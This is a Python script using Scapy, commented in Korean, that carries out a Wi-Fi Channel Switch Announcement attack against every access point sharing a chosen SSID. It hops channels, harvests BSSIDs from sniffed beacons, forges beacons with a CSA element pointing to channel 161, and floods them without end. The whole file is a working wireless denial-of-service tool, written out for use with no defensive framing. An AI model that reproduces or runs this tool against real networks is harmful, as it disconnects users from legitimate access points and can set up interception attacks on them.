from scapy.all import *
import time
import sys
import argparse
import re

parser = None
mac_list = []
csa_packets = []
deauth_packets = []
conf.verb=0
channels = [1, 6, 11, 36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116 , 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
cur_channel = 1
ALGO_OPEN_AUTH = 0  # OPN
START_SEQNUM = 1  # sequence number
SYSTEM_STR = "[\x1b[36m*\x1b[0m]"
WARN_STR = "[\x1b[31m!\x1b[0m]"
INFO_STR = "\x1b[33m-\x1b[0m"

##################################################################################################
#											usage
# 기존의 CSA Attack에서 동일한 SSID에 여러개의 맥주소가 엮여있을 경우 다수의 CSA Attack을 날리기 위해서 개발
##################################################################################################

def csa_attack(parser):
	while not len(csa_packets):
		try:
			print("[*]Sniffing wild packets")
			# 채널 호핑하면서 SSID에 해당하는 비컨프레임 수집
			for ch in channels:
				print(WARN_STR+" Channel Switching : Ch."+str(ch))
				channel_switch(parser, ch)
				global cur_channel
				cur_channel = ch
				sniff(iface=parser.interface, stop_filter = stop_filter_beacon, count = 100, timeout = 3)
			print("[*]Beacon CSA Attack Start")
			send_beacon_csa(parser)
		except KeyboardInterrupt:
			sys.exit()

##################################################################################################
#									Beacon 관련 함수들
##################################################################################################

def stop_filter_beacon(packet):
	if packet.haslayer(Dot11Beacon):
		elt = packet.getlayer(Dot11Elt)
		dot11 = packet.getlayer(Dot11)
		beacon = packet.getlayer(Dot11Beacon)
		if bytes(parser.ssid,'utf-8') == elt.info and dot11.addr3 not in mac_list:
			print("\t"+INFO_STR+" Access Point MAC Address (BSSID) : %s" % dot11.addr3)
			mac_list.append(dot11.addr3)
			make_beacon_csa(parser, elt, dot11)

	return False

def make_beacon_csa(parser, elt, dot11):
	dot11_beacon = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=dot11.addr3, addr3=dot11.addr3)
	beacon = Dot11Beacon(cap=0o411)
	frame = RadioTap()/dot11_beacon/beacon
	csa = Dot11Elt(ID=0x25,len=3,info=bytes([0,161,1]))
	flag = False
	while elt != None:
		if elt.ID > 37 and flag == False:
			flag = True
			frame = frame/csa
		information_element = Dot11Elt(ID=elt.ID, len=len(elt.info), info=elt.info)
		frame = frame/information_element
		elt = elt.payload.getlayer(Dot11Elt)
	csa_packets.append((cur_channel, frame))

def send_beacon_csa(parser):
	try:
		while True:
			for ch, frame in csa_packets:
				printProgressBar()
				channel_switch(parser, ch)
				sendp(frame, iface=parser.interface, inter = 0.001, count = 20)
	except KeyboardInterrupt:
		sys.exit() #종료

##################################################################################################
#											기타 함수
##################################################################################################

def channel_switch(parser, ch):
	os.system('iwconfig ' + parser.interface + ' channel ' + str(ch))

def show_info(parser):
	print(SYSTEM_STR+" Information")
	print("\t"+INFO_STR+" SSID Information : %s" % parser.ssid)
	print("\t"+INFO_STR+" Interface : %s" % parser.interface)

def printProgressBar():
	print("\x1b[36m->\x1b[0m",end="",flush=True)
	
##################################################################################################
#											Parser 설정
##################################################################################################

class PARSER:
	def __init__(self, opts):
		self.help = self.help(opts.help)
		self.interface = self.interface(opts.interface)
		self.ssid = opts.ssid
	
	def help(self, _help):
		if _help:
			print("HELPPPPPP")
	
	def interface(self, iface):
		def getNICnames():
			ifaces = []
			dev = open('/proc/net/dev', 'r')
			data = dev.read()
			for n in re.findall('[a-zA-Z0-9]+:', data):
				ifaces.append(n.rstrip(":"))
			return ifaces

		def confirmMon(iface):
			co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
			data = co.communicate()[0].decode()
			card = re.findall('Mode:[A-Za-z]+', data)[0]	
			if "Monitor" in card:
				return True
			else:
				return False

		if iface:
			ifaces = getNICnames()
			if iface in ifaces:
				if confirmMon(iface):
					return iface
				else:
					print("Interface Not In Monitor Mode [%s]" % (iface))
					exit(-1)
			else:
				print("Interface Not Found. [%s]" % (iface))
				exit(-1)
		else:
			print("Interface Not Provided. Specify an Interface!")
			exit(-1)

	def cast(self, casting):
		if casting == "unicast" or casting == "broadcast":
			return casting
		else:
			print("Only unicast or broadcast")
			exit(-1)


if __name__ == '__main__':
	parser = argparse.ArgumentParser(add_help=False)

	parser.add_argument('-h', '--help', dest='help', default=False, action="store_true")
	
	parser.add_argument('-i', '--interface', dest='interface', default="", type=str)
	parser.add_argument('-s', '--station', dest='sta', default="", type=str)
	parser.add_argument('-v', '--ssid', dest='ssid', default="", type=str)

	options = parser.parse_args()
	parser = PARSER(options)
	show_info(parser)
	csa_attack(parser)
